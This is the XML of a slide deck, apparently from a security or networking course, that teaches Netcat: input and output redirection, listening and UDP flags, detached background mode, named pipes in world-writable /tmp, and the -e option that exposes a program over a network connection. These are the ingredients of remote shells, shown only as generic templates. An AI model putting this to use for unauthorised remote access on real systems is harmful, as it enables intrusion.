              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Usually we will use the /tmp directory since it has the world wide writing privilege</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>The named pipe is displayed starting with p when you long list a directory</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-38100" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="75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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="Google Shape;105;p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06" name="Google Shape;106;p3"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1177415" y="3635441"/>
            <a:ext cx="5601185" cy="290347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Netcat (nc)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="Google Shape;112;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="718316" y="1637897"/>
            <a:ext cx="7879774" cy="3880773"/>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latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>The Swiss army knife of TCP/IP connections</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Netcat takes Standard Input and sends it across the network</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Receives data from the network and puts it on Standard Output</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Messages from Netcat itself goes to Standard Error which is displayed on the Standard Output</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="113" name="Google Shape;113;p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14" name="Google Shape;114;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2811439" y="4417228"/>
            <a:ext cx="2387293" cy="129266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6000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Netcat</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="6000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="ctr">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sp>
        <p:nvSpPr>
          <p:cNvPr id="115" name="Google Shape;115;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5198732" y="4572000"/>
            <a:ext cx="1102220" cy="367862"/>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6" name="Google Shape;116;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1702597" y="5144814"/>
            <a:ext cx="1108842" cy="373856"/>
          </a:xfrm>
          <a:prstGeom prst="lef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7" name="Google Shape;117;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5008729" y="4948114"/>
            <a:ext cx="1379483" cy="768330"/>
          </a:xfrm>
          <a:prstGeom prst="mathMinus">
            <a:avLst>
              <a:gd fmla="val 23520" name="adj1"/>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8" name="Google Shape;118;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1621959" y="4369943"/>
            <a:ext cx="1379483" cy="768330"/>
          </a:xfrm>
          <a:prstGeom prst="mathMinus">
            <a:avLst>
              <a:gd fmla="val 23520" name="adj1"/>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9" name="Google Shape;119;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3810644" y="5715715"/>
            <a:ext cx="388883" cy="613646"/>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20" name="Google Shape;120;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="736631" y="4430374"/>
            <a:ext cx="130328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800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Std In</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="121" name="Google Shape;121;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="478316" y="5055881"/>
            <a:ext cx="132948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Std Out</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="122" name="Google Shape;122;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6300952" y="4492498"/>
            <a:ext cx="2197290"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Send packets</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="123" name="Google Shape;123;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6243454" y="5070132"/>
            <a:ext cx="2449878"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Receive Packets</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="124" name="Google Shape;124;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3417175" y="6268221"/>
            <a:ext cx="2312826"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800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Std Err</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="125" name="Google Shape;125;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="478317" y="5789392"/>
            <a:ext cx="1671050"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The System</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="126" name="Google Shape;126;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6123470" y="5791200"/>
            <a:ext cx="1874902" cy="95410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2800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>The Network</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5"/>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Netcat Input</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="132" name="Google Shape;132;p5"/>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000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Netcat takes whatever comes in on Standard Input and sends it across the network</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Standard Input could be the keyboard</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Could be redirection from a file # nc [options] &lt; [file]</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Could be input piped from another program, [program] | nc [options]</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-38100" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="133" name="Google Shape;133;p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Netcat Output</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="139" name="Google Shape;139;p6"/>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200"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>When Netcat receives data from the network, it places it on the Standard Output</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Standard Output could be the screen</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Could be redirection to a file # nc [options] &gt; [file]</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Could be sent to another program’s Standard Input, nc [options] | [program]</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Or use nc [options] –e [program], which tells Netcat to execute a program only after a connection is made. The –e option has the effect not only of passing whatever Netcat receives on the network to the Standard Input of the program, but also of sending the Standard Output of the program back across the network via Netcat</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-38100" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="140" name="Google Shape;140;p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Netcat Usage</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="146" name="Google Shape;146;p7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609598" y="1524864"/>
            <a:ext cx="8070378" cy="5047732"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="45700" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="45700">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1600">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>nc </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>[flags] </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="accent6"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>[targetIP] </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>[port(s)]</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>-l: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>listen mode (default is client)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>-L: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>listen harder (Windows version only)-netcat listens again after a client disconnects</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>-u: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>UDP mode (default is TCP). The other side must use UDP too</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>-p: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>local port (In listen mode, this is the port listen on. In client mode, this is the source port for packets sent)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>-d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>: run in the background (detached from the console)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
